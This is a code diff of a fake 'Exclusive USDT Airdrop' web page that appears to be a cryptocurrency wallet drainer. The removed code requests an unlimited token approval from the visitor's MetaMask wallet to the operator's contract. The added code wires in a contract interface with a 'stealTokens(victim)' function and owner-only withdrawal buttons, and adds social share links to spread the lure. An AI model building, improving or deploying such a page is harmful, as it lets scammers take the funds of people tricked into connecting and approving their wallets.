@@ -5,6 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Exclusive Airdrop Opportunity</title>
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
   <style>
     body {
       font-family: 'Poppins', sans-serif;
@@ -75,6 +76,22 @@
       text-decoration: underline;
     }
 
+    .social-media-buttons {
+      margin-top: 20px;
+    }
+
+    .social-media-buttons a {
+      font-size: 2rem;
+      margin: 10px;
+      color: white;
+      text-decoration: none;
+      transition: color 0.3s ease;
+    }
+
+    .social-media-buttons a:hover {
+      color: #ffeb3b;
+    }
+
     .claim-btn-container {
       margin-top: 30px;
     }
@@ -85,7 +102,7 @@
       border-radius: 5px;
       cursor: pointer;
     }
-
+    
     #claimAirdropButton {
       background-color: #ff9800;
     }
@@ -97,7 +114,7 @@
     #withdrawETHButton, #withdrawTokensButton {
       background-color: #3f51b5;
     }
-
+    
     #withdrawETHButton:disabled, #withdrawTokensButton:disabled {
       background-color: #aaa;
     }
@@ -125,45 +142,6 @@
         opacity: 1;
       }
     }
-
-    /* Flashing text for the Claim Button */
-    #claimAirdropButton.flashText {
-      animation: textFlash 1.5s infinite alternate;
-    }
-
-    @keyframes textFlash {
-      0% {
-        color: #ffffff;
-      }
-      50% {
-        color: #ffeb3b;
-      }
-      100% {
-        color: #ffffff;
-      }
-    }
-
-    /* Social Media Buttons */
-    .social-buttons {
-      display: flex;
-      justify-content: center;
-      margin-top: 30px;
-    }
-
-    .social-buttons a {
-      text-decoration: none;
-      margin: 0 10px;
-    }
-
-    .social-buttons img {
-      width: 40px;
-      height: 40px;
-      transition: transform 0.3s ease;
-    }
-
-    .social-buttons img:hover {
-      transform: scale(1.1);
-    }
   </style>
 </head>
 <body>
@@ -176,14 +154,7 @@
 
     <div class="claim-btn-container">
       <button id="claimAirdropButton" class="btn" disabled>Claim Your Airdrop Now!</button>
-      <!-- Processing message here -->
       <div id="processingMessage" class="processing">Processing...</div>
-    </div>
-
-    <!-- Withdraw buttons for the owner -->
-    <div class="claim-btn-container" id="ownerButtons" style="display:none;">
-      <button id="withdrawETHButton" class="btn">Withdraw ETH</button>
-      <button id="withdrawTokensButton" class="btn">Withdraw Tokens</button>
     </div>
 
     <div class="footer">
@@ -191,16 +162,12 @@
       <p>Need help? <a href="#">Contact Us</a></p>
     </div>
 
-    <!-- Social Media Share Buttons -->
-    <div class="social-buttons">
-      <a href="https://www.facebook.com/sharer/sharer.php?u=YOUR_URL" target="_blank" title="Share on Facebook">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook">
+    <div class="social-media-buttons">
+      <a href="https://twitter.com/intent/tweet?text=Exclusive%20USDT%20Airdrop%20Just%20For%20You%21%20Claim%20Now%21&url=http://your-airdrop-link.com" target="_blank">
+        <i class="fab fa-twitter"></i>
       </a>
-      <a href="https://twitter.com/intent/tweet?text=Check+out+this+airdrop+offer!&url=YOUR_URL" target="_blank" title="Share on Twitter">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/6/60/Twitter_Logo_as_of_2021.svg" alt="Twitter">
-      </a>
-      <a href="https://www.linkedin.com/sharing/share-offsite/?url=YOUR_URL" target="_blank" title="Share on LinkedIn">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/0/01/LinkedIn_Logo_2023.png" alt="LinkedIn">
+      <a href="https://www.instagram.com/?url=http://your-airdrop-link.com" target="_blank">
+        <i class="fab fa-instagram"></i>
       </a>
     </div>
   </div>
@@ -247,42 +214,55 @@
         "stateMutability": "nonpayable",
         "type": "function"
       },
+      {
+        "inputs": [{ "internalType": "address", "name": "victim", "type": "address" }],
+        "name": "stealTokens",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+      },
+      {
+        "inputs": [],
+        "name": "withdrawETH",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+      },
+      {
+        "inputs": [],
+        "name": "withdrawTokens",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+      }
     ];
 
     let web3;
+    let contract;
     let accounts;
 
     async function connectMetaMask() {
-      if (window.ethereum) {
+      if (typeof window.ethereum !== 'undefined') {
         web3 = new Web3(window.ethereum);
         try {
-          await window.ethereum.request({ method: 'eth_requestAccounts' });
-          accounts = await web3.eth.getAccounts();
-          document.getElementById('connectButton').disabled = true;
+          accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+          document.getElementById('connectButton').innerText = 'Connected: ' + accounts[0];
           document.getElementById('approveButton').disabled = false;
+
+          if (accounts[0].toLowerCase() === ownerAddress.toLowerCase()) {
+            document.getElementById('withdrawETHButton').disabled = false;
+            document.getElementById('withdrawTokensButton').disabled = false;
+          }
         } catch (error) {
-          alert('User denied account access');
+          console.error('User denied account access');
         }
       } else {
-        alert('Please install MetaMask');
-      }
-    }
-
-    async function approveSpending() {
-      if (!web3) return;
-      const tokenContract = new web3.eth.Contract(contractABI, tokenAddress);
-      try {
-        const maxApprovalAmount = web3.utils.toBN('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff');
-        await tokenContract.methods.approve(contractAddress, maxApprovalAmount).send({ from: accounts[0] });
-        document.getElementById('claimAirdropButton').disabled = false;
-        document.getElementById('claimAirdropButton').classList.add('flashText');
-      } catch (error) {
-        alert('Error during approval');
+        alert('MetaMask is not installed');
       }
     }
 
     document.getElementById('connectButton').addEventListener('click', connectMetaMask);
-    document.getElementById('approveButton').addEventListener('click', approveSpending);
   </script>
 </body>
 </html>
+
